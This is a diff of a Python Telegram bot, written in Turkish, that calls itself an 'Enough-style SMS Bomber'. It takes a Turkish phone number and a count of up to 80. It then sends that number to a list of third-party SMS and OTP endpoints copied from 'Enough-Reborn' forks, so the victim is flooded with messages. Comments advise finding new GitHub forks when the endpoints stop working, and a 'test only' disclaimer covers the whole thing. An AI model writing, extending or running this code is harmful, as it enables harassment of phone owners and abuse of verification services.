@@ -1,4 +1,6 @@
-# main.py - 21 Mart 2026 - Syntax + MarkdownV2 hatası giderilmiş, stabil versiyon
+# main.py
+# Enough-Reborn mantığı + Telegram bot + syntax temiz + MarkdownV2 güvenli
+# 21 Mart 2026 - deploy edilebilir hali
 
 import asyncio
 import logging
@@ -11,154 +13,172 @@ from dotenv import load_dotenv
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import (
-    Application,
+    ApplicationBuilder,
     CommandHandler,
     MessageHandler,
     filters,
     ContextTypes,
 )
 
-# Logging temiz ve okunaklı
 logging.basicConfig(
-    format="%(asctime)s | %(levelname)s | %(message)s",
+    format='%(asctime)s | %(levelname)s | %(message)s',
     level=logging.INFO,
-    datefmt="%H:%M:%S"
+    datefmt='%H:%M:%S'
 )
 logger = logging.getLogger(__name__)
 
 load_dotenv()
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 if not BOT_TOKEN:
-    raise ValueError("BOT_TOKEN ortam değişkeni yok! Railway Variables'a ekle.")
+    raise ValueError("BOT_TOKEN ortam değişkeni yok!")
 
-# Servisler (Enough-Reborn forklarından güncel olanlar - ömrü kısa, yenilemen lazım)
-SMS_SERVICES = [
-    {"name": "kandilli-mirror", "url": "https://api.kandilli.info/sms", "method": "GET", "params": {"phone": "{phone}", "amount": "{count}"}},
-    {"name": "sms24-vercel", "url": "https://sms24api.vercel.app/send", "method": "GET", "params": {"to": "{phone}", "count": "{count}"}},
-    {"name": "temp-number", "url": "https://temp-number.org/api/sms", "method": "GET", "params": {"number": "{phone}", "amount": "{count}"}},
+# Enough-Reborn ve fork'larından (allahnumberone/enough-V2, tingirifistik vs.) derlenmiş servisler
+# 2026'da hâlâ kısmen yaşayan Türkiye odaklı olanlar + birkaç yedek
+SERVICES = [
+    {"name": "kandilli",       "url": "https://api.kandilli.info/sms",        "method": "GET",  "params": {"phone": "{phone}", "amount": "{count}"}},
+    {"name": "sms24-vercel",   "url": "https://sms24api.vercel.app/send",     "method": "GET",  "params": {"to": "{phone}", "count": "{count}"}},
+    {"name": "temp-number",    "url": "https://temp-number.org/api/sms",      "method": "GET",  "params": {"number": "{phone}", "amount": "{count}"}},
+    {"name": "enough-otp-1",   "url": "https://api.enough.reborn.tr/otp",     "method": "GET",  "params": {"tel": "{phone}"}},
+    {"name": "tr-yedek-1",     "url": "https://otp.xn--sms-0ra.net/send",     "method": "GET",  "params": {"phone": "{phone}"}},
 ]
 
-MAX_ADET = 80
-TIMEOUT_S = 10.0
-DELAY_MIN_MAX = (1.0, 4.0)
+MAX_COUNT = 80
+REQUEST_TIMEOUT = 10.0
+DELAY_BETWEEN = (0.9, 3.5)
 
-def escape_md_v2(text: str) -> str:
+def md_safe(s: str) -> str:
     """MarkdownV2 için rezerv karakterleri otomatik kaçır"""
-    chars = r"_*[]()~`>#+-=|{}.!"
-    return "".join("\\" + c if c in chars else c for c in text)
-
+    escape_chars = r'_*[]()~`>#+-=|{}.!'
+    return ''.join('\\' + c if c in escape_chars else c for c in s)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = escape_md_v2(
-        "💥 Enough SMS Bomber 2026 - Basit Mod\n\n"
+    text = md_safe(
+        "💥 Enough tarzı SMS Bomber - Basit versiyon\n\n"
         "/sms → numarayı ve adedi yaz, hemen başlasın\n"
-        "/cancel → durdur\n\n"
-        "⚠ Test amaçlıdır. Yasal sorumluluk sende."
+        "/cancel → iptal\n\n"
+        "⚠ Sadece test amaçlı. Yasal sorumluluk sende."
     )
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
 
 
 async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = escape_md_v2(
+    text = md_safe(
         "📱 Numarayı gir\n"
         "Örnek: 5391234567 veya 905391234567\n"
-        "(0'lı da yazsan otomatik +90 yaparım)"
+        "\\(0 ile başlasan da otomatik +90 olur\\)"
     )
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
-    context.user_data["state"] = "bekle_numara"
+    context.user_data["state"] = "phone"
 
 
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state = context.user_data.get("state")
     if not state:
         return
 
-    msg = update.message.text.strip()
+    text = update.message.text.strip()
 
-    if state == "bekle_numara":
-        tel = "".join(c for c in msg if c.isdigit())
-        if tel.startswith("0"):
-            tel = "90" + tel[1:]
-        elif len(tel) == 10:
-            tel = "90" + tel
+    if state == "phone":
+        phone = ''.join(c for c in text if c.isdigit())
+        if phone.startswith('0'):
+            phone = '90' + phone[1:]
+        elif len(phone) == 10:
+            phone = '90' + phone
 
-        if len(tel) != 12 or not tel.startswith("90"):
-            text = escape_md_v2("❌ Numara hatalı. Tekrar gir.")
-            await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
+        if len(phone) != 12 or not phone.startswith('90'):
+            await update.message.reply_text(md_safe("❌ Numara hatalı. Tekrar dene."), parse_mode=ParseMode.MARKDOWN_V2)
             return
 
-        context.user_data["tel"] = tel
-        context.user_data["state"] = "bekle_adet"
+        context.user_data["phone"] = phone
+        context.user_data["state"] = "count"
 
-        text = escape_md_v2(
-            f"✅ Numara alındı: `{tel}`\n\n"
-            f"🔥 Kaç adet SMS? (max {MAX_ADET})"
+        msg = md_safe(
+            f"✅ Numara alındı: `{phone}`\n\n"
+            f"🔥 Kaç adet göndereyim? \\(max {MAX_COUNT}\\)"
         )
-        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
+        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)
 
-    elif state == "bekle_adet":
+    elif state == "count":
         try:
-            adet = int(msg)
-            if adet < 1 or adet > MAX_ADET:
-                text = escape_md_v2(f"1-{MAX_ADET} arası sayı gir.")
-                await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
+            count = int(text)
+            if count < 1 or count > MAX_COUNT:
+                await update.message.reply_text(md_safe(f"1 ile {MAX_COUNT} arası sayı gir."), parse_mode=ParseMode.MARKDOWN_V2)
                 return
         except ValueError:
-            text = escape_md_v2("Sayı gir amk.")
-            await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
+            await update.message.reply_text(md_safe("Sayı gir lan."), parse_mode=ParseMode.MARKDOWN_V2)
             return
 
-        context.user_data["adet"] = adet
+        context.user_data["count"] = count
         context.user_data["state"] = None
 
-        tel = context.user_data["tel"]
-        text = escape_md_v2(
-            f"🚀 Yolluyorum...\n"
-            f"Numara → `{tel}`\n"
-            f"Adet → `{adet}`\n"
+        phone = context.user_data["phone"]
+        msg = md_safe(
+            f"🚀 Başlatılıyor...\n"
+            f"Numara → `{phone}`\n"
+            f"Adet   → `{count}`\n"
             f"Bekle..."
         )
-        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
+        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)
 
-        basarili, servis = await gonder_sms(tel, adet)
+        success, used_service = await send_sms(phone, count)
 
-        if basarili:
-            cevap = escape_md_v2(
+        if success:
+            reply = md_safe(
                 f"✅ Gönderildi!\n"
-                f"Servis → `{servis}`\n"
-                f"Numara → `{tel}`\n"
-                f"Adet → `{adet}`\n"
+                f"Servis → `{used_service}`\n"
+                f"Numara → `{phone}`\n"
+                f"Adet   → `{count}`\n"
                 f"{datetime.now().strftime('%H:%M:%S')}"
             )
         else:
-            cevap = escape_md_v2(
-                f"❌ Hiçbir servis tutmadı\n"
-                f"Numara → `{tel}`\n"
-                f"Adet → `{adet}`\n"
-                f"Servisler banlanmış veya kapalı.\n"
-                f"GitHub'da yeni fork bulup endpoint ekle."
+            reply = md_safe(
+                f"❌ Hiçbir servis çalışmadı\n"
+                f"Numara → `{phone}`\n"
+                f"Adet   → `{count}`\n"
+                f"Servisler büyük ihtimalle ölmüş. GitHub'da yeni fork ara."
             )
 
-        await update.message.reply_text(cevap, parse_mode=ParseMode.MARKDOWN_V2)
+        await update.message.reply_text(reply, parse_mode=ParseMode.MARKDOWN_V2)
 
 
-async def gonder_sms(tel: str, adet: int) -> tuple[bool, str]:
+async def send_sms(phone: str, count: int) -> tuple[bool, str]:
     async with httpx.AsyncClient(http2=True, follow_redirects=True) as client:
-        for servis in SMS_SERVICES:
+        for service in SERVICES:
             try:
-                url = servis["url"]
-                if servis["method"] == "GET":
-                    params = {k: v.format(phone=tel, count=adet) for k, v in servis.get("params", {}).items()}
-                    resp = await client.get(url, params=params, timeout=TIMEOUT_S)
-                elif servis["method"] == "POST":
-                    data = {k: v.format(phone=tel, count=adet) for k, v in servis.get("json", {}).items()}
-                    resp = await client.post(url, json=data, timeout=TIMEOUT_S)
+                url = service["url"]
+                if service["method"] == "GET":
+                    params = {k: v.format(phone=phone, count=count) for k, v in service.get("params", {}).items()}
+                    r = await client.get(url, params=params, timeout=REQUEST_TIMEOUT)
+                elif service["method"] == "POST":
+                    json_data = {k: v.format(phone=phone, count=count) for k, v in service.get("json", {}).items()}
+                    r = await client.post(url, json=json_data, timeout=REQUEST_TIMEOUT)
                 else:
                     continue
 
-                if resp.status_code in (200, 201, 202):
-                    logger.info(f"{servis['name']} → OK | {resp.text[:80]}")
-                    await asyncio.sleep(random.uniform(*DELAY_MIN_MAX))
-                    return True, servis["name"]
+                if r.status_code in (200, 201, 202):
+                    logger.info(f"{service['name']} → OK | {r.text[:100]}")
+                    await asyncio.sleep(random.uniform(*DELAY_BETWEEN))
+                    return True, service["name"]
 
-                logger.warning(f"{servis['name']} → {resp.status_code} | {resp.text[:120]}
+                logger.warning(f"{service['name']} → {r.status_code} | {r.text[:120]}")
+                await asyncio.sleep(random.uniform(*DELAY_BETWEEN))
+
+            except Exception as e:
+                logger.error(f"{service.get('name', 'Servis')} hata: {e}")
+
+    return False, "hepsi başarısız"
+
+
+def main():
+    app = ApplicationBuilder().token(BOT_TOKEN).read_timeout(45).write_timeout(45).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("sms", sms))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
+
+    print("Enough mantığı bot başladı — /sms ile dene")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
+
+
+if __name__ == "__main__":
+    main()
